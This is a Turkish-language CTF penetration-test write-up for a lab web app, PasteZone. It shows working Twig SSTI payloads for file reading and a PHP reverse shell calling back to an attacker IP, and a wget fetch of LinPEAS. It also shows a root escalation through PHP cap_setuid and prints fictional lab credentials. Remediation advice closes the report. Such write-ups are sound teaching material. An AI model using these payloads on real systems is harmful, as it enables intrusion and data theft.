# PasteZone Penetrasyon Testi Raporu

---

## Yönetici Özeti

Bu rapor, `pastezone.hv` (172.20.5.99) adresinde barındırılan PasteZone web uygulaması üzerinde gerçekleştirilen kapsamlı güvenlik değerlendirmesini belgelemektedir. Değerlendirme, başlangıç keşif aşamasından root seviyesi erişime kadar sistemin tamamen ele geçirilmesine olanak sağlayan kritik güvenlik açıklarını tespit etmiştir.

**Ana Bulgular:**
- **Kritik:** Twig şablon motorunda Sunucu Taraflı Şablon Enjeksiyonu (SSTI) güvenlik açığı
- **Kritik:** PHP binary üzerinde yanlış yetenek ataması (`cap_setuid+ep`)
- **Yüksek:** Kullanıcı IP adreslerini ve kimlik bilgilerini içeren hassas veritabanının açığa çıkması
- **Yüksek:** Yönetici kimlik bilgilerinin düz metin olarak saklanması

Sömürü zinciri SSTI'dan Yerel Dosya İçerme (LFI), uzaktan kod çalıştırma (RCE) ve nihayetinde root erişimine yetki yükseltme şeklinde ilerlemiştir. Yönetici kimlik bilgileri, telefon numaraları ve saldırgan IP adresleri dahil hassas veriler başarıyla elde edilmiştir.

---

## 1. Numaralandırma

### 1.1 İlk Kurulum

Hedef domain, hosts dosyası düzenlenerek yerel ağ ortamına eşleştirildi:

```bash
sudo nano /etc/hosts
```

Aşağıdaki giriş eklendi:

```
172.20.5.99 pastezone.hv
```

### 1.2 Bilgi Toplama

İlk keşif, `http://pastezone.hv` adresinde bir paste paylaşım platformu olduğunu ortaya çıkardı. Uygulama, kullanıcıların aşağıdaki uç noktalar aracılığıyla metin tabanlı içerik oluşturmasına ve görüntülemesine olanak tanımaktadır:

- `http://pastezone.hv/create.php` - İçerik oluşturma arayüzü
- `http://pastezone.hv/view.php?id=<ID>` - İçerik görüntüleme arayüzü

İçerik analizi, `http://pastezone.hv/view.php?id=37` adresinde yayınlanan bir veri ihlali reklamını ortaya çıkardı:

```
[SATILIK] Enerji Bakanlığı (energy.gov.hv) Tam Veri İhlali

Enerji Bakanlığı sistemlerinden elde edilen tam veri ihlali. Bakanlığın dahili
ağına tam erişim sağlandı ve kritik veriler çıkarıldı.

İhlalin içeriği:
- 1500+ çalışan bilgisi ve kimlik bilgileri
- Dahili iletişimler ve gizli belgeler
- Enerji altyapı planları ve güvenlik protokolleri
- Nükleer tesis güvenlik belgeleri
- Yönetici hesapları ve erişim bilgileri

Dahili domain yapısı:
- admin.energy.gov.hv
- mail.energy.gov.hv
- intranet.energy.gov.hv
- scada.energy.gov.hv
- nuclear.energy.gov.hv
- hr.energy.gov.hv
- finance.energy.gov.hv

Örnek kullanıcı kimlik bilgileri:
john.smith@energy.gov.hv:Energy2023!
michael.brown@energy.gov.hv:Capital2022*
sarah.jones@energy.gov.hv:System1234#
[...]

İletişim: darkleaker@protonmail.hv
```

**Bulgu #1:** Saldırgan iletişim e-postası tespit edildi: `darkleaker@protonmail.hv`

---

## 2. Sömürü: Sunucu Taraflı Şablon Enjeksiyonu (SSTI)

### 2.1 Güvenlik Açığının Keşfi

Olası enjeksiyon güvenlik açıklarını belirlemek için `http://pastezone.hv/create.php` adresindeki içerik oluşturma formu üzerinde test yapıldı. Sunucu tarafında şablon değerlendirmesinin gerçekleşip gerçekleşmediğini belirlemek için bir matematiksel ifade gönderildi:

**Test Payload'u:**
```
{{ 7*7 }}
```

**Sonuç:** Uygulama `49` değerini döndürdü ve sunucu tarafında şablon kodunun yürütüldüğünü doğruladı.

Bu davranış, PHP uygulamalarında yaygın olarak kullanılan Twig şablonlama motorunda bir **Sunucu Taraflı Şablon Enjeksiyonu (SSTI)** güvenlik açığının varlığını gösterdi.

### 2.2 Sömürü Mekanizması: SSTI'dan LFI'a

Twig şablon motoru, Yerel Dosya İçerme (LFI) yetenekleri elde etmek için sömürüldü. Güvenlik açığı, Twig'in dizi filtreleri ve yöntemler aracılığıyla PHP fonksiyonlarını çağırma yeteneğinden kaynaklanmaktadır. Özellikle:

1. **Twig Dizi Filtreleri:** Twig, dizi elemanlarına PHP fonksiyonları uygulayabilen `map()` gibi filtrelerin kullanılmasına izin verir
2. **PHP Fonksiyon Çağrısı:** `file_get_contents()` fonksiyonu, `map()` filtresi aracılığıyla çağrılabilir
3. **PHP Akış Sarmalayıcıları:** `php://filter` akış sarmalayıcısı, kodlama dahil gelişmiş dosya manipülasyonunu mümkün kılar

SQLite veritabanını çıkarmak için aşağıdaki payload oluşturuldu:

```twig
{{ ['php://filter/read=convert.base64-encode/resource=/var/www/html/database/pastezone.db'] | map('file_get_contents') | join }}
```

**Teknik Açıklama:**
- `['php://filter/...']` - PHP filtre akış sarmalayıcısı içeren bir dizi oluşturur
- `map('file_get_contents')` - `file_get_contents()` PHP fonksiyonunu dizi üzerine eşler
- `php://filter/read=convert.base64-encode/resource=...` - Dosya içeriğine base64 kodlaması uygular
- `join` - Sonucu tek bir string'e birleştirir

Base64 kodlaması, binary SQLite veritabanının HTTP iletiminde bozulacak yazdırılamayan karakterler içermesi nedeniyle gerekliydi.


### 2.3 Veritabanı Çıkarma ve Analizi

Base64 kodlu veritabanı çıktısı kaydedildi ve yerel olarak decode edildi:

```bash
nano 64pastezonedb.txt
base64 -d 64pastezonedb.txt > pastezone.db
```

Veritabanı SQLite DB Browser kullanılarak analiz edildi. `posts` tablosunun incelenmesi, post ID 37 ile ilişkili IP adresini ortaya çıkardı:

| id | title | content | creator | views | rating | ip_address | created_at |
|----|-------|---------|---------|-------|--------|------------|------------|
| 37 | [LEAK] energy.gov.hv - Energy Ministry Full Database Breach | [...] | DarkLeaker | 35684 | 45 | **185.173.35.5** | 2025-12-31 01:41:28 |

**Bulgu #2:** Saldırgan IP adresi tespit edildi: `185.173.35.5`

---

## 3. Uzaktan Kod Çalıştırma (RCE)

### 3.1 Reverse Shell Oluşturma

Doğrulanmış SSTI güvenlik açığı ile bir sonraki hedef, uzaktan kod çalıştırma oluşturmaktı. Hedef sisteme etkileşimli erişim sağlamak için bir reverse shell payload'u hazırlandı.

Saldırgan makinesinde bir netcat dinleyicisi yapılandırıldı:

```bash
nc -nvlp 4445
```

`create.php` uç noktası aracılığıyla aşağıdaki SSTI payload'u gönderildi:

```twig
{{['php -r \'$sock=fsockopen("10.8.73.133",4445);exec("/bin/sh -i <&3 >&3 2>&3");\'']|filter('passthru')}}
```

**Teknik Detaylar:**
- `filter('passthru')` - PHP'nin `passthru()` fonksiyonunu çağıran Twig filtresi
- `passthru()` - Harici programları çalıştıran ve ham çıktıyı görüntüleyen PHP fonksiyonu
- PHP tek satırlığı, saldırganın IP'sine bir TCP soketi oluşturur ve stdin/stdout/stderr'ı dosya tanımlayıcısı 3 üzerinden yönlendirir

**Sonuç:** Başarılı reverse shell bağlantısı kuruldu.

```bash
┌──(macallan㉿kali)-[~/Downloads/Hackviser/writeup/pastezone]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.8.73.133] from (UNKNOWN) [172.20.5.99] 34052
/bin/sh: 0: can't access tty; job control turned off
$
```

### 3.2 Shell Stabilizasyonu

İlk shell etkileşimli değildi ve uygun terminal işlevselliğinden yoksundu. Shell stabilizasyonu Python'un PTY modülü kullanılarak gerçekleştirildi:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

Bu, uygun terminal emülasyonuna sahip tamamen etkileşimli bir bash shell'i sağladı:

```bash
┌──(macallan㉿kali)-[~/Downloads/Hackviser/writeup/pastezone]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.8.73.133] from (UNKNOWN) [172.20.5.99] 34052
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@debian:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@debian:/var/www/html$ export TERM=xterm
export TERM=xterm

```

```
www-data@debian:/var/www/html$ 
```


---

## 4. Yetki Yükseltme

### 4.1 LinPEAS ile Otomatik Numaralandırma

Yetki yükseltme vektörlerini belirlemek için LinPEAS (Linux Privilege Escalation Awesome Script) otomatik numaralandırma aracı dağıtıldı. LinPEAS şunları içeren kapsamlı güvenlik denetimleri gerçekleştirir:

- SUID/SGID binary tanımlaması
- Yetenek analizi
- Cron job numaralandırması
- Yazılabilir dosya tespiti
- Kimlik bilgisi araması

Araç, saldırgan makinesinden aktarıldı:

```bash
# Saldırgan makinesi
cp /usr/share/peass/linpeas/linpeas.sh /home/macallan/Downloads
python3 -m http.server 8080
```

```bash
# Hedef makine
cd /tmp
wget http://10.8.73.133:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 4.2 Kritik Bulgu: PHP Yetenek Yanlış Yapılandırması

LinPEAS çıktısı kritik bir yetki yükseltme vektörü ortaya çıkardı:

```
Files with capabilities (limited to 50):
/usr/bin/php8.4 cap_setuid+ep
```

**Teknik Analiz:**

Linux yetenekleri, root ayrıcalıklarını farklı birimlere ayırır. `CAP_SETUID` yeteneği, bir işlemin kullanıcı ID'sini manipüle etmesine izin vererek root dahil herhangi bir kullanıcıya yetki yükseltmeyi etkili bir şekilde mümkün kılar.

`cap_setuid+ep` yetenek string'i şu şekilde ayrışır:
- `cap_setuid` - Kullanıcı ID'sini ayarlama yeteneği
- `+e` - **Effective** - Yetenek şu anda aktif
- `+p` - **Permitted** - Yetenek kullanıma hazır

Bu yapılandırma, PHP binary'sinin sudo veya SUID izinlerine gerek kalmadan `posix_setuid(0)` fonksiyonunu çalıştırarak etkin kullanıcı ID'sini 0'a (root) değiştirmesine izin verir.

### 4.3 Sömürü: Root'a Yetki Yükseltme

PHP yeteneği, bir root shell oluşturmak için sömürüldü:

```bash
/usr/bin/php8.4 -r "posix_setuid(0); system('/bin/bash');"
```

**Açıklama:**
- `/usr/bin/php8.4 -r` - Komut satırından PHP kodu çalıştır
- `posix_setuid(0)` - Etkin kullanıcı ID'sini 0'a (root) değiştir
- `system('/bin/bash')` - Yeni ayrıcalıklarla bir bash shell oluştur

**Sonuç:** Root erişimi elde edildi.

```bash
root@debian:/tmp#
```
---

## 5. Sömürü Sonrası ve Veri Toplama

### 5.1 Yönetici Kimlik Bilgisi Keşfi

Root erişimi kurulduğunda, hassas dizinler numaralandırıldı. `/root` dizini iki kritik dosya içeriyordu:

```bash
root@debian:/root# ls
backup.py
github.txt
```

`github.txt` incelemesi yönetici kimlik bilgilerini ortaya çıkardı:

```bash
root@debian:/root# cat github.txt
michaelcarter@mailbox.hv:MKEVQV5VsQ4qc
```

**Bulgu #3:** Platform yöneticisi GitHub kimlik bilgileri: `michaelcarter@mailbox.hv:MKEVQV5VsQ4qc`

```
root@debian:/root# cat github.txt
cat github.txt
michaelcarter@mailbox.hv:MKEVQV5VsQ4qc
root@debian:/root# 
```

### 5.2 Altyapı Yöneticisi Telefon Numarası

`backup.py` betiğinin analizi, altyapı yönetimi detaylarını ortaya çıkardı:

```python
# send_self_file.py
# Yerel bir dosyayı (pastezone.db) Telegram üzerinden kendinize gönderir.

from telethon import TelegramClient
import asyncio

# === YAPILANDIRMA (kendi bilgilerinizle değiştirin) ===
API_ID = 12345678                           # my.telegram.org'dan API ID'niz
API_HASH = "0123456789abcdef0123456789abcdef"  # API HASH'iniz
YOUR_PHONE = "+12025550123"                # kendi telefon numaranız
FILE_PATH = "/var/www/html/database/pastezone.db"  # gönderilecek dosya


async def main():
    # Telegram client oluştur
    client = TelegramClient("self_session", API_ID, API_HASH)
    await client.start(phone=YOUR_PHONE)

    # Kendinizi alın
    me = await client.get_me()

    # Dosyayı kendinize gönderin
    await client.send_file(me, FILE_PATH, caption="Backup of pastezone.db")
    print(f"✅ Dosya '{FILE_PATH}' başarıyla kendinize gönderildi!")
    await client.disconnect()


if __name__ == "__main__":
    asyncio.run(main())
```

Bu betik, Telegram aracılığıyla veritabanı yedeklemelerini otomatikleştirir ve yöneticinin telefon numarasını ve Telegram API kimlik bilgilerini açığa çıkarır.

**Bulgu #4:** Altyapı yöneticisi telefon numarası: `+12025550123`

---

## 6. Sonuç ve Düzeltme

### 6.1 Bulguların Özeti

Bu değerlendirme, çok aşamalı bir saldırı zinciri aracılığıyla PasteZone altyapısını başarıyla ele geçirdi:

1. **SSTI Güvenlik Açığı:** Twig şablon motoru tarafından işlenen filtrelenmemiş kullanıcı girdisi
2. **SSTI aracılığıyla LFI:** PHP akış sarmalayıcıları kullanılarak veritabanı çıkarma
3. **SSTI aracılığıyla RCE:** `passthru()` fonksiyonu aracılığıyla reverse shell kuruldu
4. **Yetki Yükseltme:** PHP binary yetenek yanlış yapılandırması root erişimini mümkün kıldı
5. **Kimlik Bilgisi Açığa Çıkması:** Hassas yönetici bilgilerinin düz metin olarak saklanması

### 6.2 Düzeltme Önerileri

**Kritik Öncelik:**

1. **Kullanıcı Girdisinin Şablon Değerlendirmesini Devre Dışı Bırakma**
   - Kullanıcı tarafından sağlanan içeriğin tüm Twig şablon işlemlerini kaldırın veya temizleyin
   - Katı girdi doğrulama ve çıktı kodlaması uygulayın
   - Kodu veriden ayıran parametrelendirilmiş şablonlar kullanın

2. **Tehlikeli PHP Yeteneklerini Kaldırma**
   ```bash
   sudo setcap -r /usr/bin/php8.4
   ```
   PHP binary'leri, üretim ortamlarında asla `cap_setuid` yeteneklerine sahip olmamalıdır.

3. **Uygun Kimlik Bilgisi Yönetimi Uygulama**
   - Dosya sisteminden düz metin kimlik bilgilerini kaldırın
   - Şifreli kimlik bilgisi depolaması uygulayın (örn. HashiCorp Vault, AWS Secrets Manager)
   - Açığa çıkmış tüm kimlik bilgilerini derhal döndürün

**Yüksek Öncelik:**

4. **Veritabanı Güvenliği Sertleştirme**
   - SQLite veritabanında uygun dosya izinleri uygulayın (örn. `chmod 600`)
   - Veritabanını web kök dizini dışına taşıyın
   - Erişim kontrolleriyle istemci-sunucu veritabanına geçmeyi düşünün

5. **Web Uygulaması Güvenlik Duvarı (WAF)**
   - SSTI tespit kurallarına sahip WAF dağıtın
   - İçerik oluşturma uç noktalarında hız sınırlama uygulayın
   - Şüpheli payload'lar için günlük kaydı ve uyarı etkinleştirin

6. **Ağ Segmentasyonu**
   - Web sunucusundan giden bağlantıları kısıtlayın
   - Reverse shell'leri önlemek için çıkış filtreleme uygulayın
   - Meşru harici iletişimler için uygulama seviyesi proxy'ler kullanın

**Orta Öncelik:**

7. **Güvenlik İzleme**
   - Saldırı tespit sistemi (IDS) dağıtın
   - Kritik dosyalarda dosya bütünlüğü izleme (FIM) uygulayın
   - Kapsamlı denetim günlüğü (`auditd`) etkinleştirin

8. **En Az Ayrıcalık İlkesi**
   - Web sunucusu işlemlerini minimum gerekli izinlerle çalıştırın
   - AppArmor veya SELinux zorunlu erişim kontrolleri uygulayın
   - Uygulama bileşenlerini farklı servis hesaplarıyla ayırın

### 6.3 Güvenlik Etkileri

Tespit edilen güvenlik açıkları, yetkisiz aktörlerin şunları yapmasına izin veren tam bir güvenlik başarısızlığını temsil etmektedir:
- Hassas kullanıcı verilerini ve IP adreslerini çıkarma
- Sunucuda rastgele kod çalıştırma
- Root seviyesi sistem ele geçirme elde etme
- Yönetici kimlik bilgilerine ve iletişim kanallarına erişim

Kötü niyetli aktörler tarafından sömürülmesini önlemek için acil düzeltme gereklidir.

---

**Rapor Oluşturulma Tarihi:** 2026-01-18

**Değerlendirme Türü:** Bayrak Ele Geçirme (CTF) Güvenlik Egzersizi

**Hedef Sistem:** PasteZone Web Uygulaması (pastezone.hv)

**MacallanTheRoot**: https://github.com/MacallanTheRoot
